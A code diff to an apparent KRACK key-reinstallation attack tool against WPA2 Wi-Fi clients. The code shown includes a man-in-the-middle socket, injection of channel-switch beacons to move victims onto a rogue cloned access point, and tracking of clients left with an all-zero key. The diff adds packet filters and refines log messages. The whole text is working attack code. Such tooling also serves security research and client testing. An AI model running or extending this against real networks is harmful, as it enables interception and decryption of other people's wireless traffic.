@@ -62,6 +62,9 @@ class MitmSocket(L2Socket):
 	def set_channel(self, channel):
 		subprocess.check_output(["iw", self.iface, "set", "channel", str(channel)])
 
+	def attach_filter(self, bpf):
+		attach_filter(self.ins, bpf, self.iface)
+
 	def send(self, p):
 		# Hack: set the More Data flag so we can detect injected frames
 		p[Dot11].FCfield |= 0x20
@@ -108,12 +111,10 @@ class MitmSocket(L2Socket):
 		# Hack: ignore frames that we just injected and are echoed back by the kernel. Note that the More Data flag also
 		#	allows us to detect cross-channel frames (received due to proximity of transmissors on different channel)
 		if p[Dot11].FCfield & 0x20 != 0 and (not self.strict_echo_test or self.radiotap_possible_injection):
-			log(DEBUG, "%s: ignoring echoed injected frame %s (0x%02X, present=%08X, %d)" % (self.iface, dot11_to_str(p), p[Dot11].FCfield, p[RadioTap].present, radiotap_possible_injection))
+			log(DEBUG, "%s: ignoring echoed frame %s (0x%02X, present=%08X, strict=%d)" % (self.iface, dot11_to_str(p), p[Dot11].FCfield, p[RadioTap].present, radiotap_possible_injection))
 			return None
 		else:
-			log(ALL, "Received frame: %s" % dot11_to_str(p))
-
-		log(ALL, "%s: received frame: %s" % (self.iface, dot11_to_str(p)))
+			log(ALL, "%s: Received frame: %s" % (self.iface, dot11_to_str(p)))
 
 		# Strip the FCS if present, and drop the RadioTap header
 		return self._strip_fcs(p)
@@ -445,7 +446,7 @@ class KRAckAttack():
 		newchannel = self.netconfig.rogue_channel
 
 		for i in range(numbeacons):
-			# FIXME: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
+			# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
 			# followed by one with a value of 1. When starting with 1 it errors out.
 			csabeacon = append_csa(self.beacon, newchannel, 2)
 			self.sock_real.send(csabeacon)
@@ -665,7 +666,7 @@ class KRAckAttack():
 							client.update_state(ClientState.Success_AllzeroKey)
 
 					elif client.attack_timeout(iv):
-						log(WARNING, "KRAck Attack seems to have failed")
+						log(WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
 						client.update_state(ClientState.Failed)
 
 					client.save_iv_keystream(iv, keystream)
@@ -705,6 +706,14 @@ class KRAckAttack():
 		# Set the MAC address of the rogue hostapd AP
 		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_mac_address(self.nic_rogue_ap, self.apmac)
+
+		# Set BFP filters to increase performance
+		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
+		if self.clientmac:
+			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
+		bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
+		self.sock_real.attach_filter(bpf)
+		self.sock_rogue.attach_filter(bpf)
 
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("hostapd_rogue.conf", "w") as fp:
